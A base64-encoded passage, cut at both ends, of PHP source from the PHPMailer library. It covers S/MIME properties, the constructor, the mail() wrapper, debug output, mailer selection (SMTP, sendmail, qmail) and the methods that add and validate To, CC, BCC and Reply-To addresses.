JGxhbmd1YWdlID0gYXJyYXkoKTsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBudW1iZXIgb2YgZXJyb3JzIGVuY291bnRlcmVkLg0KICAgICAqIEB2YXIgaW50ZWdlcg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRlcnJvcl9jb3VudCA9IDA7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgUy9NSU1FIGNlcnRpZmljYXRlIGZpbGUgcGF0aC4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOw0KDQogICAgLyoqDQogICAgICogVGhlIFMvTUlNRSBrZXkgZmlsZSBwYXRoLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHNpZ25fa2V5X2ZpbGUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBvcHRpb25hbCBTL01JTUUgZXh0cmEgY2VydGlmaWNhdGVzICgiQ0EgQ2hhaW4iKSBmaWxlIHBhdGguDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkc2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBTL01JTUUgcGFzc3dvcmQgZm9yIHRoZSBrZXkuDQogICAgICogVXNlZCBvbmx5IGlmIHRoZSBrZXkgaXMgZW5jcnlwdGVkLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHNpZ25fa2V5X3Bhc3MgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFdoZXRoZXIgdG8gdGhyb3cgZXhjZXB0aW9ucyBmb3IgZXJyb3JzLg0KICAgICAqIEB2YXIgYm9vbGVhbg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRleGNlcHRpb25zID0gZmFsc2U7DQoNCiAgICAvKioNCiAgICAgKiBVbmlxdWUgSUQgdXNlZCBmb3IgbWVzc2FnZSBJRCBhbmQgYm91bmRhcmllcy4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOw0KDQogICAgLyoqDQogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2Ugb25seSwgY29udGludWUgcHJvY2Vzc2luZy4NCiAgICAgKi8NCiAgICBjb25zdCBTVE9QX01FU1NBR0UgPSAwOw0KDQogICAgLyoqDQogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2UsIGxpa2VseSBvayB0byBjb250aW51ZSBwcm9jZXNzaW5nLg0KICAgICAqLw0KICAgIGNvbnN0IFNUT1BfQ09OVElOVUUgPSAxOw0KDQogICAgLyoqDQogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2UsIHBsdXMgZnVsbCBzdG9wLCBjcml0aWNhbCBlcnJvciByZWFjaGVkLg0KICAgICAqLw0KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOw0KDQogICAgLyoqDQogICAgICogU01UUCBSRkMgc3RhbmRhcmQgbGluZSBlbmRpbmcuDQogICAgICovDQogICAgY29uc3QgQ1JMRiA9ICINCiI7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkIGJ5IFJGQyAyODIyIHNlY3Rpb24gMi4xLjENCiAgICAgKiBAdmFyIGludGVnZXINCiAgICAgKi8NCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7DQoNCiAgICAvKioNCiAgICAgKiBDb25zdHJ1Y3Rvci4NCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkZXhjZXB0aW9ucyBTaG91bGQgd2UgdGhyb3cgZXh0ZXJuYWwgZXhjZXB0aW9ucz8NCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGV4Y2VwdGlvbnMgPSBudWxsKQ0KICAgIHsNCiAgICAgICAgaWYgKCRleGNlcHRpb25zICE9PSBudWxsKSB7DQogICAgICAgICAgICAkdGhpcy0+ZXhjZXB0aW9ucyA9IChib29sZWFuKSRleGNlcHRpb25zOw0KICAgICAgICB9DQogICAgICAgIC8vUGljayBhbiBhcHByb3ByaWF0ZSBkZWJ1ZyBvdXRwdXQgZm9ybWF0IGF1dG9tYXRpY2FsbHkNCiAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0ID0gKHN0cnBvcyhQSFBfU0FQSSwgJ2NsaScpICE9PSBmYWxzZSA/ICdlY2hvJyA6ICdodG1sJyk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRGVzdHJ1Y3Rvci4NCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpDQogICAgew0KICAgICAgICAvL0Nsb3NlIGFueSBvcGVuIFNNVFAgY29ubmVjdGlvbiBuaWNlbHkNCiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIENhbGwgbWFpbCgpIGluIGEgc2FmZV9tb2RlLWF3YXJlIGZhc2hpb24uDQogICAgICogQWxzbywgdW5sZXNzIHNlbmRtYWlsX3BhdGggcG9pbnRzIHRvIHNlbmRtYWlsIChvciBzb21ldGhpbmcgdGhhdA0KICAgICAqIGNsYWltcyB0byBiZSBzZW5kbWFpbCksIGRvbid0IHBhc3MgcGFyYW1zIChub3QgYSBwZXJmZWN0IGZpeCwNCiAgICAgKiBidXQgaXQgd2lsbCBkbykNCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0byBUbw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QgU3ViamVjdA0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgTWVzc2FnZSBCb2R5DQogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIEFkZGl0aW9uYWwgSGVhZGVyKHMpDQogICAgICogQHBhcmFtIHN0cmluZyAkcGFyYW1zIFBhcmFtcw0KICAgICAqIEBhY2Nlc3MgcHJpdmF0ZQ0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHByaXZhdGUgZnVuY3Rpb24gbWFpbFBhc3N0aHJ1KCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKQ0KICAgIHsNCiAgICAgICAgLy9DaGVjayBvdmVybG9hZGluZyBvZiBtYWlsIGZ1bmN0aW9uIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZw0KICAgICAgICBpZiAoaW5pX2dldCgnbWJzdHJpbmcuZnVuY19vdmVybG9hZCcpICYgMSkgew0KICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KSk7DQogICAgICAgIH0NCg0KICAgICAgICAvL0Nhbid0IHVzZSBhZGRpdGlvbmFsX3BhcmFtZXRlcnMgaW4gc2FmZV9tb2RlLCBjYWxsaW5nIG1haWwoKSB3aXRoIG51bGwgcGFyYW1zIGJyZWFrcw0KICAgICAgICAvL0BsaW5rIGh0dHA6Ly9waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5tYWlsLnBocA0KICAgICAgICBpZiAoaW5pX2dldCgnc2FmZV9tb2RlJykgb3IgISR0aGlzLT5Vc2VTZW5kbWFpbE9wdGlvbnMgb3IgaXNfbnVsbCgkcGFyYW1zKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KICAgIC8qKg0KICAgICAqIE91dHB1dCBkZWJ1Z2dpbmcgaW5mbyB2aWEgdXNlci1kZWZpbmVkIG1ldGhvZC4NCiAgICAgKiBPbmx5IGdlbmVyYXRlcyBvdXRwdXQgaWYgU01UUCBkZWJ1ZyBvdXRwdXQgaXMgZW5hYmxlZCAoQHNlZSBTTVRQOjokZG9fZGVidWcpLg0KICAgICAqIEBzZWUgUEhQTWFpbGVyOjokRGVidWdvdXRwdXQNCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JFNNVFBEZWJ1Zw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cg0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlZGVidWcoJHN0cikNCiAgICB7DQogICAgICAgIGlmICgkdGhpcy0+U01UUERlYnVnIDw9IDApIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICAvL0F2b2lkIGNsYXNoIHdpdGggYnVpbHQtaW4gZnVuY3Rpb24gbmFtZXMNCiAgICAgICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIGFycmF5KCdlcnJvcl9sb2cnLCAnaHRtbCcsICdlY2hvJykpIGFuZCBpc19jYWxsYWJsZSgkdGhpcy0+RGVidWdvdXRwdXQpKSB7DQogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7DQogICAgICAgICAgICBjYXNlICdlcnJvcl9sb2cnOg0KICAgICAgICAgICAgICAgIC8vRG9uJ3Qgb3V0cHV0LCBqdXN0IGxvZw0KICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2h0bWwnOg0KICAgICAgICAgICAgICAgIC8vQ2xlYW5zIHVwIG91dHB1dCBhIGJpdCBmb3IgYSBiZXR0ZXIgbG9va2luZywgSFRNTC1zYWZlIG91dHB1dA0KICAgICAgICAgICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKA0KICAgICAgICAgICAgICAgICAgICBwcmVnX3JlcGxhY2UoJy9bDQpdKy8nLCAnJywgJHN0ciksDQogICAgICAgICAgICAgICAgICAgIEVOVF9RVU9URVMsDQogICAgICAgICAgICAgICAgICAgICdVVEYtOCcNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgLiAiPGJyPg0KIjsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAvL05vcm1hbGl6ZSBsaW5lIGJyZWFrcw0KICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy8NCj8vbXMnLCAiDQoiLCAkc3RyKTsNCiAgICAgICAgICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSAuICIJIiAuIHN0cl9yZXBsYWNlKA0KICAgICAgICAgICAgICAgICAgICAiDQoiLA0KICAgICAgICAgICAgICAgICAgICAiDQogICAgICAgICAgICAgICAgICAgCSAgICAgICAgICAgICAgICAgICIsDQogICAgICAgICAgICAgICAgICAgIHRyaW0oJHN0cikNCiAgICAgICAgICAgICAgICApIC4gIg0KIjsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgU01UUC4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTTVRQKCkNCiAgICB7DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc210cCc7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBQSFAncyBtYWlsKCkgZnVuY3Rpb24uDQogICAgICogQHJldHVybiB2b2lkDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGlzTWFpbCgpDQogICAgew0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ21haWwnOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgJFNlbmRtYWlsLg0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NlbmRtYWlsKCkNCiAgICB7DQogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsNCg0KICAgICAgICBpZiAoIXN0cmlzdHIoJGluaV9zZW5kbWFpbF9wYXRoLCAnc2VuZG1haWwnKSkgew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBxbWFpbC4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNRbWFpbCgpDQogICAgew0KICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7DQoNCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsNCiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdmFyL3FtYWlsL2Jpbi9xbWFpbC1pbmplY3QnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAncW1haWwnOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBhICJUbyIgYWRkcmVzcy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lDQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRBZGRyZXNzKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ3RvJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYSAiQ0MiIGFkZHJlc3MuDQogICAgICogQG5vdGU6IFRoaXMgZnVuY3Rpb24gd29ya3Mgd2l0aCB0aGUgU01UUCBtYWlsZXIgb24gd2luMzIsIG5vdCB3aXRoIHRoZSAibWFpbCIgbWFpbGVyLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5DQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZENDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ2NjJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYSAiQkNDIiBhZGRyZXNzLg0KICAgICAqIEBub3RlOiBUaGlzIGZ1bmN0aW9uIHdvcmtzIHdpdGggdGhlIFNNVFAgbWFpbGVyIG9uIHdpbjMyLCBub3Qgd2l0aCB0aGUgIm1haWwiIG1haWxlci4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lDQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRCQ0MoJGFkZHJlc3MsICRuYW1lID0gJycpDQogICAgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnYmNjJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYSAiUmVwbHktVG8iIGFkZHJlc3MuDQogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byByZXBseSB0bw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5DQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZFJlcGx5VG8oJGFkZHJlc3MsICRuYW1lID0gJycpDQogICAgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnUmVwbHktVG8nLCAkYWRkcmVzcywgJG5hbWUpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4gQmVjYXVzZSBQSFBNYWlsZXINCiAgICAgKiBjYW4ndCB2YWxpZGF0ZSBhZGRyZXNzZXMgd2l0aCBhbiBJRE4gd2l0aG91dCBrbm93aW5nIHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0ICh0aGF0IGNhbiBzdGlsbA0KICAgICAqIGJlIG1vZGlmaWVkIGFmdGVyIGNhbGxpbmcgdGhpcyBmdW5jdGlvbiksIGFkZGl0aW9uIG9mIHN1Y2ggYWRkcmVzc2VzIGlzIGRlbGF5ZWQgdW50aWwgc2VuZCgpLg0KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHlUbycNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQsIHJlc3AuIHRvIHJlcGx5IHRvDQogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQ0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQ0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZE9yRW5xdWV1ZUFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lKQ0KICAgIHsNCiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsNCiAgICAgICAgJG5hbWUgPSB0cmltKHByZWdfcmVwbGFjZSgnL1sNCl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQ0KICAgICAgICBpZiAoKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgIC8vIEF0LXNpZ24gaXMgbWlzc3NpbmcuDQogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKGFkZEFuQWRkcmVzcyAka2luZCk6ICRhZGRyZXNzIjsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRwYXJhbXMgPSBhcnJheSgka2luZCwgJGFkZHJlc3MsICRuYW1lKTsNCiAgICAgICAgLy8gRW5xdWV1ZSBhZGRyZXNzZXMgd2l0aCBJRE4gdW50aWwgd2Uga25vdyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldC4NCiAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBhbmQgJHRoaXMtPmlkblN1cHBvcnRlZCgpKSB7DQogICAgICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgew0KICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlcGx5VG9RdWV1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgLy8gSW1tZWRpYXRlbHkgYWRkIHN0YW5kYXJkIGFkZHJlc3NlcyB3aXRob3V0IElETi4NCiAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KCR0aGlzLCAnYWRkQW5BZGRyZXNzJyksICRwYXJhbXMpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4NCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kIE9uZSBvZiAndG8nLCAnY2MnLCAnYmNjJywgb3IgJ1JlcGx5VG8nDQogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kLCByZXNwLiB0byByZXBseSB0bw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUNCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbg0KICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSA9ICcnKQ0KICAgIHsNCiAgICAgICAgaWYgKCFpbl9hcnJheSgka2luZCwgYXJyYXkoJ3RvJywgJ2NjJywgJ2JjYycsICdSZXBseS1UbycpKSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnSW52YWxpZCByZWNpcGllbnQga2luZDogJykgLiAka2luZDsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsNCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRraW5kICE9ICdSZXBseS1UbycpIHsNCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPmFsbF9yZWNpcGllbnRzKSkgew0KICAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHRoaXMtPiRraW5kLCBhcnJheSgkYWRkcmVzcywgJG5hbWUpKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkYWRkcmVzcyldID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPlJlcGx5VG8pKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9bc3RydG9sb3dlcigkYWRkcmVzcyldID0gYXJyYXkoJGFkZHJlc3MsICRuYW1lKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogUGFyc2UgYW5kIHZhbGlkYXRlIGEgc3RyaW5nIGNvbnRhaW5pbmcgb25lIG9yIG1vcmUgUkZDODIyLXN0eWxlIGNvbW1hLXNlcGFyYXRlZCBlbWFpbCBhZGRyZXNzZXMNCiAgICAgKiBvZiB0aGUgZm9ybSAiZGlzcGx